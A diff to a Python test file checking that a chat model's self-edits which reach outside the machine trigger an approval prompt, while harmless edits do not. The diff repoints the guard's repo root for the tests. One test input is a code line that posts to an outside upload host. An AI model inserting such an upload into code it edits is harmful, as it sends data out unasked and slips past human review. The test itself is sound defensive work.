@@ -1,6 +1,8 @@
 """The limits on what a chat model can reach: code it runs has no network,
 web requests go only to sites the person named or a search found, and a
 self-edit that reaches outside the machine always asks."""
+import sys
+
 from backend.services import code_sandbox, web_provenance
 
 
@@ -68,13 +70,18 @@ def test_calls_from_outside_a_chat_are_not_limited():
 # --- self-edits that reach outside ----------------------------------------
 
 def test_a_self_edit_adding_an_upload_always_asks(monkeypatch, tmp_path):
-    from backend.services import agent_tools, self_edit
+    from backend.services import agent_tools, inbound_guard_service, self_edit
     from backend.tools.agent_tools.code_manipulation_tools import EditCodeTool
 
     target = tmp_path / "backend" / "thing.py"
     target.parent.mkdir(parents=True)
     target.write_text("import hashlib\n")
     monkeypatch.setattr(self_edit, "repo_root", lambda: tmp_path)
+    # The guard names a change by its path under the repo. Left on the real
+    # root, it would see this file by its absolute path, whose pytest folder
+    # (test_...) reads as a test file, and the network rules skip tests.
+    monkeypatch.setattr(inbound_guard_service, "REPO_ROOT", tmp_path)
+    monkeypatch.setattr(sys, "path", list(sys.path))  # engine() adds its root to sys.path
     params = {"filepath": str(target), "old_text": "import hashlib\n",
               "new_text": 'import hashlib\nimport requests\nrequests.post("https://uploads.example-bucket.cn/u")\n'}
     tool = EditCodeTool()
@@ -83,13 +90,18 @@ def test_a_self_edit_adding_an_upload_always_asks(monkeypatch, tmp_path):
 
 
 def test_a_harmless_self_edit_does_not_force_a_card(monkeypatch, tmp_path):
-    from backend.services import agent_tools, self_edit
+    from backend.services import agent_tools, inbound_guard_service, self_edit
     from backend.tools.agent_tools.code_manipulation_tools import EditCodeTool
 
     target = tmp_path / "backend" / "thing.py"
     target.parent.mkdir(parents=True)
     target.write_text("import hashlib\n")
     monkeypatch.setattr(self_edit, "repo_root", lambda: tmp_path)
+    # The guard names a change by its path under the repo. Left on the real
+    # root, it would see this file by its absolute path, whose pytest folder
+    # (test_...) reads as a test file, and the network rules skip tests.
+    monkeypatch.setattr(inbound_guard_service, "REPO_ROOT", tmp_path)
+    monkeypatch.setattr(sys, "path", list(sys.path))  # engine() adds its root to sys.path
     params = {"filepath": str(target), "old_text": "import hashlib\n", "new_text": "import hashlib\nimport math\n"}
     tool = EditCodeTool()
     assert tool.always_ask(params) is None
